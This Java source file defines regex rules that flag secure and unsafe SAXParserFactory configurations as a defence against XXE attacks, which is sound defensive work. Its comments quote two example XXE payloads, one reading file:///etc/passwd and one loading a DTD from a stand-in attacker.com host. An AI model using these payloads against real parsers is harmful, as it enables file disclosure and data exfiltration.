/**
 * XXE Security Configuration Regex Rules for SAXParser/SAXParserFactory
 * 
 * This file contains regex patterns to detect secure configurations that prevent XXE attacks
 * when using javax.xml.parsers.SAXParserFactory and SAXParser.
 * 
 * XXE (XML External Entity) Attack Background:
 * - SAX (Simple API for XML) parsers are event-driven and commonly used for performance
 * - Default SAXParserFactory configurations are typically vulnerable to XXE
 * - SAXParser processes XML sequentially, making it memory-efficient but still vulnerable
 * 
 * Security Requirements for SAXParserFactory:
 * SAXParserFactory must be configured with specific features to prevent XXE:
 * 
 * 1. FEATURE_SECURE_PROCESSING (XMLConstants.FEATURE_SECURE_PROCESSING)
 *    - Enables secure processing mode with resource limits
 *    - Pattern: spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)
 * 
 * 2. Disallow DOCTYPE declarations (STRONGEST PROTECTION)
 *    - Completely disables DTD processing
 *    - Pattern: spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
 *    - Throws SAXParseException if DOCTYPE is encountered
 * 
 * 3. Disable external general entities
 *    - Prevents loading external general entities from URLs or file system
 *    - Pattern: spf.setFeature("http://xml.org/sax/features/external-general-entities", false)
 * 
 * 4. Disable external parameter entities
 *    - Prevents loading external parameter entities used in DTD
 *    - Pattern: spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false)
 * 
 * 5. Disable XInclude processing
 *    - XInclude can be used to include external content
 *    - Pattern: spf.setXIncludeAware(false)
 * 
 * 6. Disable loading external DTD
 *    - Pattern: spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false)
 * 
 * Best Practice for SAXParserFactory:
 * - Always set disallow-doctype-decl to true if DTD is not needed
 * - If DTD is required, disable both external-general-entities and external-parameter-entities
 * - Combine FEATURE_SECURE_PROCESSING for additional protection
 * - Ensure XInclude is disabled if not used
 */

package com.XXE.regex_evaluation;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

public class SAXParser_regex_rules {
    
    /**
     * Regex pattern to detect FEATURE_SECURE_PROCESSING configuration
     * Matches: spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)
     * Enables resource limits and secure defaults
     */
    public static final String FEATURE_SECURE_PROCESSING_PATTERN = 
        "\\w+\\.setFeature\\s*\\(\\s*XMLConstants\\.FEATURE_SECURE_PROCESSING\\s*,\\s*true\\s*\\)";
    
    /**
     * Regex pattern to detect disallow-doctype-decl configuration
     * Matches: spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
     * STRONGEST PROTECTION - Completely prevents DTD processing
     * Will throw SAXParseException: "DOCTYPE is disallowed" if DTD is present
     */
    public static final String DISALLOW_DOCTYPE_PATTERN = 
        "\\w+\\.setFeature\\s*\\(\\s*[\"']http://apache\\.org/xml/features/disallow-doctype-decl[\"']\\s*,\\s*true\\s*\\)";
    
    /**
     * Regex pattern to detect external-general-entities disabled
     * Matches: spf.setFeature("http://xml.org/sax/features/external-general-entities", false)
     * Prevents resolution of external general entities like:
     * <!ENTITY xxe SYSTEM "file:///etc/passwd">
     */
    public static final String EXTERNAL_GENERAL_ENTITIES_DISABLED_PATTERN = 
        "\\w+\\.setFeature\\s*\\(\\s*[\"']http://xml\\.org/sax/features/external-general-entities[\"']\\s*,\\s*false\\s*\\)";
    
    /**
     * Regex pattern to detect external-parameter-entities disabled
     * Matches: spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false)
     * Prevents resolution of external parameter entities used in DTD:
     * <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
     */
    public static final String EXTERNAL_PARAMETER_ENTITIES_DISABLED_PATTERN = 
        "\\w+\\.setFeature\\s*\\(\\s*[\"']http://xml\\.org/sax/features/external-parameter-entities[\"']\\s*,\\s*false\\s*\\)";
    
    /**
     * Regex pattern to detect XInclude disabled
     * Matches: spf.setXIncludeAware(false)
     * Prevents XInclude-based inclusion of external content
     */
    public static final String XINCLUDE_DISABLED_PATTERN = 
        "\\w+\\.setXIncludeAware\\s*\\(\\s*false\\s*\\)";
    
    /**
     * Regex pattern to detect load-external-dtd disabled
     * Matches: spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false)
     * Prevents loading external DTD files
     */
    public static final String LOAD_EXTERNAL_DTD_DISABLED_PATTERN = 
        "\\w+\\.setFeature\\s*\\(\\s*[\"']http://apache\\.org/xml/features/nonvalidating/load-external-dtd[\"']\\s*,\\s*false\\s*\\)";
    
    /**
     * Regex pattern to detect validation disabled
     * Matches: spf.setFeature("http://xml.org/sax/features/validation", false)
     * Disabling validation can help prevent DTD-based attacks
     */
    public static final String VALIDATION_DISABLED_PATTERN = 
        "\\w+\\.setFeature\\s*\\(\\s*[\"']http://xml\\.org/sax/features/validation[\"']\\s*,\\s*false\\s*\\)";
    
    /**
     * Regex pattern to detect SAXParserFactory instantiation
     * Matches: SAXParserFactory.newInstance() or SAXParserFactory spf = ...
     * Used to identify code blocks that need security configuration
     */
    public static final String SAX_PARSER_FACTORY_CREATION_PATTERN = 
        "SAXParserFactory\\s*\\w*\\s*=\\s*SAXParserFactory\\.newInstance\\s*\\(\\s*\\)";
    
    /**
     * Regex pattern to detect SAXParser.parse() method calls
     * Matches: parser.parse(input, handler)
     * Identifies where XML parsing actually occurs - should be preceded by security config
     */
    public static final String SAX_PARSER_PARSE_PATTERN = 
        "\\w+\\.parse\\s*\\([^)]+\\)";
    
    /**
     * Composite pattern for MINIMUM secure configuration
     * A SAXParserFactory is considered minimally secure if it has:
     * - Either disallow-doctype-decl enabled (STRONGEST)
     * - OR both external-general-entities AND external-parameter-entities disabled
     * 
     * Usage: Check if code block contains these configurations
     */
    public static final String MINIMAL_SECURE_CONFIG_PATTERN = 
        "(" + DISALLOW_DOCTYPE_PATTERN + ")|" +
        "(" + EXTERNAL_GENERAL_ENTITIES_DISABLED_PATTERN + ".*" + EXTERNAL_PARAMETER_ENTITIES_DISABLED_PATTERN + ")";
    
    /**
     * Comprehensive secure configuration pattern (BEST PRACTICE)
     * Includes all recommended security features:
     * - FEATURE_SECURE_PROCESSING
     * - disallow-doctype-decl OR (external-general-entities + external-parameter-entities)
     * - XInclude disabled
     * - load-external-dtd disabled
     * 
     * This represents the GOLD STANDARD for SAXParser security
     */
    public static final String COMPREHENSIVE_SECURE_CONFIG_PATTERN = 
        "(" + FEATURE_SECURE_PROCESSING_PATTERN + ").*(" + 
        DISALLOW_DOCTYPE_PATTERN + "|" +
        "(" + EXTERNAL_GENERAL_ENTITIES_DISABLED_PATTERN + ".*" + 
        EXTERNAL_PARAMETER_ENTITIES_DISABLED_PATTERN + ")).*" +
        "(" + XINCLUDE_DISABLED_PATTERN + ")";

    /**
     * Regex rule requiring SAXParserFactory to enable secure processing, block XXE vectors,
     * disable XInclude, and stop external DTD loading to mitigate XXE and XML bomb DoS.
     */
    public static final String ESSENTIAL_SECURITY_RULE_PATTERN =
        "(?=.*\\w+\\.setFeature\\s*\\(\\s*XMLConstants\\.FEATURE_SECURE_PROCESSING\\s*,\\s*true\\s*\\))(?=.*\\w+\\.setFeature\\s*\\(\\s*[\"']http://apache\\.org/xml/features/nonvalidating/load-external-dtd[\"']\\s*,\\s*false\\s*\\))(?=.*\\w+\\.setXIncludeAware\\s*\\(\\s*false\\s*\\))(?:(?=.*\\w+\\.setFeature\\s*\\(\\s*[\"']http://apache\\.org/xml/features/disallow-doctype-decl[\"']\\s*,\\s*true\\s*\\))|(?:(?=.*\\w+\\.setFeature\\s*\\(\\s*[\"']http://xml\\.org/sax/features/external-general-entities[\"']\\s*,\\s*false\\s*\\))(?=.*\\w+\\.setFeature\\s*\\(\\s*[\"']http://xml\\.org/sax/features/external-parameter-entities[\"']\\s*,\\s*false\\s*\\))))";
    
    /**
     * Anti-pattern: Unsafe SAXParserFactory usage
     * Detects SAXParserFactory creation WITHOUT proper security configuration
     * This pattern should NOT match in secure code - indicates vulnerability
     */
    public static final String UNSAFE_SAX_PARSER_PATTERN = 
        "SAXParserFactory\\.newInstance\\s*\\(\\s*\\)(?!.*setFeature.*(?:disallow-doctype-decl|external-general-entities))";
    
    /**
     * Pattern to detect manual secure configuration attempt
     * Matches when external-general-entities is set to TRUE (UNSAFE!)
     * This is a common mistake - should be FALSE
     */
    public static final String UNSAFE_EXTERNAL_ENTITIES_ENABLED_PATTERN = 
        "\\w+\\.setFeature\\s*\\(\\s*[\"']http://xml\\.org/sax/features/external-general-entities[\"']\\s*,\\s*true\\s*\\)";
    
    /**
     * Get all compiled patterns for secure configurations
     * @return List of compiled Pattern objects for security validation
     */
    public static List<Pattern> getSecureConfigPatterns() {
        List<Pattern> patterns = new ArrayList<>();
        patterns.add(Pattern.compile(FEATURE_SECURE_PROCESSING_PATTERN, Pattern.DOTALL));
        patterns.add(Pattern.compile(DISALLOW_DOCTYPE_PATTERN, Pattern.DOTALL));
        patterns.add(Pattern.compile(EXTERNAL_GENERAL_ENTITIES_DISABLED_PATTERN, Pattern.DOTALL));
        patterns.add(Pattern.compile(EXTERNAL_PARAMETER_ENTITIES_DISABLED_PATTERN, Pattern.DOTALL));
        patterns.add(Pattern.compile(XINCLUDE_DISABLED_PATTERN, Pattern.DOTALL));
        patterns.add(Pattern.compile(LOAD_EXTERNAL_DTD_DISABLED_PATTERN, Pattern.DOTALL));
        patterns.add(Pattern.compile(VALIDATION_DISABLED_PATTERN, Pattern.DOTALL));
        patterns.add(Pattern.compile(ESSENTIAL_SECURITY_RULE_PATTERN, Pattern.DOTALL));
        return patterns;
    }
    
    /**
     * Get the minimal secure configuration pattern
     * Code must match this pattern to be considered minimally secure
     * @return Compiled Pattern for minimal security check
     */
    public static Pattern getMinimalSecurePattern() {
        return Pattern.compile(MINIMAL_SECURE_CONFIG_PATTERN, Pattern.DOTALL);
    }
    
    /**
     * Get the comprehensive secure configuration pattern
     * Code matching this pattern follows all best practices
     * @return Compiled Pattern for comprehensive security check
     */
    public static Pattern getComprehensiveSecurePattern() {
        return Pattern.compile(COMPREHENSIVE_SECURE_CONFIG_PATTERN, Pattern.DOTALL);
    }
    
    /**
     * Get the unsafe usage pattern
     * Code matching this pattern is VULNERABLE to XXE attacks
     * @return Compiled Pattern for vulnerability detection
     */
    public static Pattern getUnsafePattern() {
        return Pattern.compile(UNSAFE_SAX_PARSER_PATTERN, Pattern.DOTALL);
    }
    
    /**
     * Get the unsafe external entities enabled pattern
     * Detects common misconfiguration where external entities are explicitly enabled
     * @return Compiled Pattern for detecting dangerous configuration
     */
    public static Pattern getUnsafeExternalEntitiesEnabledPattern() {
        return Pattern.compile(UNSAFE_EXTERNAL_ENTITIES_ENABLED_PATTERN, Pattern.DOTALL);
    }
}
